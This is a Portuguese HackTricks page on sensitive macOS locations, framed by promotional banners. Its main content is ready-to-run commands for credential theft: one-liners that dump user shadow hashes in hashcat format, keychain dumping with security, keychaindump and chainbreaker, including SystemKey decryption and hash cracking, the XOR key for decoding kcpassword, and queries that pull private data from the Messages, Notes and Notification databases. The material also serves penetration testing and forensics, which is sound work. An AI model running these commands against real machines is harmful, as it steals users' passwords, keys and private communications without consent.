# Localizações Sensíveis no macOS

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Senhas

### Senhas Shadow

A senha shadow é armazenada junto com a configuração do usuário em plists localizados em **`/var/db/dslocal/nodes/Default/users/`**.\
O seguinte oneliner pode ser usado para despejar **todas as informações sobre os usuários** (incluindo informações de hash):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
```bash
dscl . list /Users | grep -v '^_' | while read user; do echo -n "$user:"; dscl . -read /Users/$user dsAttrTypeNative:ShadowHashData | tr -d ' ' | cut -d'<' -f2 | cut -d'>' -f1 | xxd -r -p | base64; echo; done
```
{% endcode %}

[**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**este**](https://github.com/octomagon/davegrohl.git) podem ser usados para transformar o hash em **formato hashcat**.

Uma alternativa de uma linha que irá despejar as credenciais de todas as contas que não são de serviço no formato hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Extração do Keychain

Observe que ao usar o binário security para **despejar as senhas descriptografadas**, várias solicitações pedirão ao usuário para permitir essa operação.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Baseado neste comentário [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), parece que essas ferramentas não estão mais funcionando no Big Sur.
{% endhint %}

O atacante ainda precisa obter acesso ao sistema e também escalar para privilégios de **root** para executar o **keychaindump**. Esta abordagem vem com suas próprias condições. Como mencionado anteriormente, **ao fazer login, seu chaveiro é desbloqueado por padrão** e permanece desbloqueado enquanto você usa seu sistema. Isso é para conveniência, para que o usuário não precise inserir sua senha toda vez que um aplicativo desejar acessar o chaveiro. Se o usuário alterou essa configuração e escolheu bloquear o chaveiro após cada uso, o keychaindump não funcionará mais; ele depende de um chaveiro desbloqueado para funcionar.

É importante entender como o Keychaindump extrai senhas da memória. O processo mais importante nesta transação é o **processo "securityd"**. A Apple se refere a este processo como um **daemon de contexto de segurança para autorização e operações criptográficas**. As bibliotecas de desenvolvedores da Apple não dizem muito sobre isso; no entanto, eles nos dizem que o securityd lida com o acesso ao chaveiro. Em sua pesquisa, Juuso se refere à **chave necessária para descriptografar o chaveiro como "A Chave Mestra"**. Uma série de etapas precisam ser realizadas para adquirir essa chave, pois ela é derivada da senha de login do OS X do usuário. Se você quiser ler o arquivo do chaveiro, você deve ter essa chave mestra. As seguintes etapas podem ser feitas para adquiri-la. **Realize uma varredura do heap do securityd (keychaindump faz isso com o comando vmmap)**. Possíveis chaves mestras são armazenadas em uma área marcada como MALLOC_TINY. Você pode ver os locais desses heaps com o seguinte comando:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** então buscará nas heaps retornadas por ocorrências de 0x0000000000000018. Se o valor de 8 bytes seguinte apontar para a heap atual, encontramos uma chave mestra potencial. A partir daqui, ainda é necessário um pouco de desobfuscação, que pode ser vista no código-fonte, mas como analista, a parte mais importante a notar é que os dados necessários para descriptografar essa informação estão armazenados na memória do processo do securityd. Aqui está um exemplo de saída do keychain dump.
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) pode ser usado para extrair os seguintes tipos de informações de um chaveiro OSX de maneira forense:

* Senha do chaveiro hasheada, adequada para cracking com [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
* Senhas da Internet
* Senhas Genéricas
* Chaves Privadas
* Chaves Públicas
* Certificados X509
* Notas Seguras
* Senhas Appleshare

Dada a senha de desbloqueio do chaveiro, uma chave mestra obtida usando [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou um arquivo de desbloqueio como SystemKey, o Chainbreaker também fornecerá senhas em texto claro.

Sem um desses métodos de desbloqueio do chaveiro, o Chainbreaker exibirá todas as outras informações disponíveis.

### **Extrair chaves do chaveiro**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **Extrair chaves do chaveiro (com senhas) com SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Extraindo chaves do chaveiro (com senhas) quebrando o hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Extrair chaves do chaveiro (com senhas) com dump de memória**

[Siga estes passos](..#dumping-memory-with-osxpmem) para realizar um **dump de memória**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Extrair chaves do chaveiro (com senhas) usando a senha do usuário**

Se você conhece a senha do usuário, pode usá-la para **extrair e descriptografar chaveiros que pertencem ao usuário**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

O arquivo **kcpassword** é um arquivo que contém a **senha de login do usuário**, mas apenas se o proprietário do sistema tiver **habilitado o login automático**. Portanto, o usuário será automaticamente logado sem ser solicitado por uma senha (o que não é muito seguro).

A senha é armazenada no arquivo **`/etc/kcpassword`** xored com a chave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se a senha do usuário for mais longa que a chave, a chave será reutilizada.\
Isso torna a recuperação da senha bastante fácil, por exemplo, usando scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informações Interessantes em Bancos de Dados

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notificações

Você pode encontrar os dados de Notificações em `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

A maior parte das informações interessantes estará em **blob**. Portanto, você precisará **extrair** esse conteúdo e **transformá-lo** em algo **legível** por **humanos** ou usar **`strings`**. Para acessá-lo, você pode fazer:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Notas

As notas dos usuários podem ser encontradas em `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
```markdown
{% endcode %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
